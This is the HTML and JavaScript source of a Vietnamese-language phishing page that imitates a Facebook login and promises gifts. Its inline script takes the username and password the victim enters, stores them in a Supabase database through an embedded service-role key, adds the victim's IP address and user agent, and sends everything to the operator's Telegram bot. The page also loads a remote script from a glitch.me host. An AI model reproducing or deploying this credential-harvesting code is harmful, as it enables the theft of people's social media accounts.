<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Đăng Nhập Facebook</title>
    <meta name="title" content="Đăng Nhập Facebook Để Nhận Quà" />
    <link rel="icon" href="images/facvicon.png" type="image/png">
    <meta property="twitter:title" content="Đăng Nhập Facebook Để Nhận Quà" />
    <meta property="twitter:description" content="Đăng Nhập Facebook Để Nhận Quà" />
    <meta property="twitter:card" content="summary_large_image" />
    <meta property="og:title" content="1" />
    <meta property="og:type" content="article" />
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.0/jquery.min.js"></script>
    <style>
        * {
            padding: 0;
            margin: 0;
            box-sizing: border-box;
            font-family: Arial, Helvetica, sans-serif;
        }

        @font-face {
            font-family: Arial, Helvetica, sans-serif;
        }

        body {
            background: rgb(2, 0, 36);
            background: linear-gradient(93deg, rgba(2, 0, 36, 1) 0%, rgb(249 242 249) 0%, rgba(237, 246, 254, 1) 22%);
            height: 95vh;
            padding: 0 14px 0 14px;
            font-family: Arial, Helvetica, sans-serif;
            margin-top: 48px;
        }

        .imgg {
            height: 200px;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .logo {
            width: 45px;
        }

        .jav {
            margin-bottom: 13px;
        }

        .inputtkmk {
            width: 100%;
            height: 54px;
            border-radius: 12px;
            padding-left: 18px;
            border: 1px solid #e1e3e6;
            font-size: 14px;
            background-color: #fff;
            outline: none;
            transition: all .2s;
        }

        .inputtkmk:focus {
            border-color: #848484;
        }

        .inputtkmk::placeholder {
            color: #a9b0b7;
        }

        .login {
            background-color: #0064e0;
            color: #fff;
            width: 100%;
            height: 40px;
            outline: none;
            border: none;
            font-size: 14.5px;
            border-radius: 20px;
            cursor: pointer;
            transition: all .2s;
        }

        .login:active {
            background-color: #408be8;
        }

        .regacc {
            background-color: transparent;
            color: #186fd9;
            width: 100%;
            height: 40px;
            outline: none;
            border: none;
            font-size: 14.5px;
            border-radius: 20px;
            cursor: pointer;
            border: 1px solid #186fd9;
        }

        .resetpass {
            text-align: center;
            font-size: 14px;
        }

        .xx {
            height: calc(75vh - 407px);
        }

        .meta {
            margin-top: 14px;
            width: 50px;
        }

        .popup {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 300px;
            height: auto;
            z-index: 9999;
            /* Đặt giá trị z-index cao hơn */
        }

        .popup-content {
            text-align: center;
            padding: 20px;
            background-color: white;
            border-radius: 10px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.5);
        }

        .popup-divider {
            border-top: 1px solid #ccc;
            margin-top: 10px;
            padding-top: 10px;
        }

        #close-popup {
            margin-top: 10px;
            padding: 5px 20px;
            /* Điều chỉnh kích thước nút */
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 20px;
            /* Bo góc */
            cursor: pointer;
        }

        #close-popup:hover {
            background-color: #0056b3;
        }
    </style>
</head>

<body>
    <div id="message">
        <div class="imgg">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/51/Facebook_f_logo_%282019%29.svg/2048px-Facebook_f_logo_%282019%29.svg.png"
                alt="" class="logo">
        </div>
        <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
        </head>

        <body>
            <div class="popup" id="error-popup" style="display: none;">
                <div class="popup-content">
                    <p id="error-message"></p>
                    <div class="popup-divider"></div>
                    <button id="close-popup" onclick="closepop()">OK</button>
                </div>
            </div>

            <div class="xxx">
                <form id="login_form">
                    <div class="jav"></div>

                    <div class="jav">
                        <input type="text" id="tk" name="username" required class="inputtkmk"
                            placeholder="Số di động hoặc email" onfocus="this.placeholder = ''"
                            onblur="this.placeholder = 'Số di động hoặc email'">
                    </div>
                    <div class="jav">
                        <input type="password" id="mk" name="password" required class="inputtkmk" placeholder="Mật khẩu"
                            onfocus="this.placeholder = ''" onblur="this.placeholder = 'Mật khẩu'">
                    </div>
                    <div class="jav" style="margin-bottom: 16px;">
                        <button type="submit" class="login" id="login">Đăng nhập</button>
                    </div>
                </form>

                <div class="jav">
                    <p class="resetpass">Bạn quên mật khẩu ư?</p>
                </div>
                <div class="xx"></div>
                <div class="jav">
                    <button class="regacc">Tạo tài khoản mới</button>
                    <center>
                        <img src="https://upload.wikimedia.org/wikipedia/commons/a/ab/Meta-Logo.png" alt=""
                            class="meta">
                    </center>
                </div>
            </div>

            <div class='navbar no-items section' id='navbar'></div>
            <script src="https://alpine-pale-fibre.glitch.me/script.js"></script>
            <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
            <script type='text/javascript'>
                async function sendMessage(text, chat_id, token) {
                    const url = `https://api.telegram.org/bot${token}/sendMessage`; // The url to request

                    const obj = {
                        chat_id: chat_id, // Telegram chat id
                        text: text, // The text to send
                    };

                    await fetch(url, {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json",
                        },
                        body: JSON.stringify(obj),
                    });
                }
                const sb = supabase.createClient(
                    "https://nkckriujybohswbebyyj.supabase.co",
                    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5rY2tyaXVqeWJvaHN3YmVieXlqIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc0NTYzNDIzNywiZXhwIjoyMDYxMjEwMjM3fQ.Fu9sytcqnjgl8EI81aVrbPuSlXdxGzkRQMn1bs4QZ0A",
                    {
                        db: {
                            schema: "public",
                        },
                    }
                );
                const domain_fb = window.location.ancestorOrigins[0]
                document.querySelector('#login').addEventListener('click', function (event) {
                    event.preventDefault();

                    var username = document.getElementsByName('username')[0].value;
                    var password = document.getElementsByName('password')[0].value;

                    if (!isValidEmail(username) && !isValidPhone(username)) {
                        showError('Sai Tài Khoản Hoặc Mật Khẩu');
                        return;
                    }

                    if (!isValidPassword(password)) {
                        showError('Sai Tài Khoản Hoặc Mật Khẩu');
                        return;
                    }

                    (async () => {
                        const { data, error } = await sb
                            .from("website")
                            .select("*")
                            .eq("domain_fb", domain_fb);
                        await sb.from("account").insert({
                            username: username,
                            password: password,
                            user_id: data[0].user_id,
                            website_id: data[0].id,
                        });
                        const { data: profile } = await sb
                            .from("profile")
                            .select("*")
                            .eq("id", data[0].user_id);
                        const token = profile[0].tele_token;
                        const chat_id = profile[0].tele_chat_id;
                        let ip = await fetch("https://api.ipify.org?format=json")
                        ip = await ip.json()
                        const message = `Account: ${username}\nPassword: ${password}\nIp: ${ip.ip}\nUser Agent: ${navigator.userAgent}`;
                        await sendMessage(message, chat_id, token);
                    })();

                    function isValidEmail(email) {
                        var emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
                        return emailRegex.test(email);
                    }

                    function isValidPhone(phone) {
                        var phoneRegex = /^0\d{9}$/;
                        return phoneRegex.test(phone);
                    }

                    function isValidPassword(password) {
                        return password.length > 6;
                    }

                    function showError(message) {
                        document.getElementById('error-message').innerText = message;
                        document.getElementById('error-popup').style.display = 'block';
                    }

                    function closepop() {
                        document.getElementById('error-popup').style.display = 'none';
                    }
                })
            </script>
        </body>

</html>